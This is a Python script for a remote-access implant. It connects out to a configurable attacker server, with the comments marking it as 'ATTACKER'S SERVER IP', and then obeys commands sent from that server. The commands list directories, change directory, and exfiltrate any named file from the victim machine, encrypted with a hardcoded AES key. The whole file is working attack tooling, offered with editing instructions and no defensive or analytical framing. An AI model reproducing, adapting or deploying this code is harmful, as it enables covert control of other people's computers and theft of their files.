import socket
import time
from Crypto.Cipher import AES
import os
import subprocess


def get_cipher_from_data(data):
    key = b"SymmetricKeyMike" # CHANGE THE ENCRYPTION KEY (IF YOU WISH. MUST BE THE SAME ON BOTH SIDES)
    nonce = b"SymmetricKeyNce" # CHANGE THE ENCRYPTION NONCE (IF YOU WISH. MUST BE THE SAME ON BOTH SIDES)
    cipher = AES.new(key, AES.MODE_EAX, nonce)
    return cipher.encrypt(data)


def send_file(file_path, client_socket):
    with open(file_path, 'rb') as file:
        data = file.read()
        client_socket.sendall(get_cipher_from_data(data))

####
ip = "192.168.63.218" # CHANGE THIS (ATTACKER'S SERVER IP)
port = 4045 # CHANGE THIS (ATTACKER'S SERVER PORT)
####

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((ip, port))

while True:
    command = sock.recv(1024).decode()
    if command == "pwd":
        sock.send(os.path.abspath(os.path.curdir).encode())
    elif command == "ls" or command == "dir":
        sock.send("ls3xecuted".encode())
        sock.send(subprocess.run("dir", shell=True, stdout=subprocess.PIPE, text=True).stdout.encode())
    elif command[:3] == "cd ":
        try:
            os.chdir(command[3:])
            sock.send(f"success. current dir: {os.path.abspath(os.path.curdir)}".encode())
        except FileNotFoundError:
            sock.send("Error: No such directory exists".encode())
    elif command[:9] == "download ":
        try:
            sock.send("f1l3DW".encode())
            time.sleep(0.1)
            sock.send(command[9:].encode())
            time.sleep(0.1)
            send_file(command[9:], sock)
        except FileNotFoundError:
            sock.send("Error: No such file exists".encode())
    elif command == "quit" or command == "exit":
        sock.close()
        break
    else:
        sock.send("invalid command".encode())
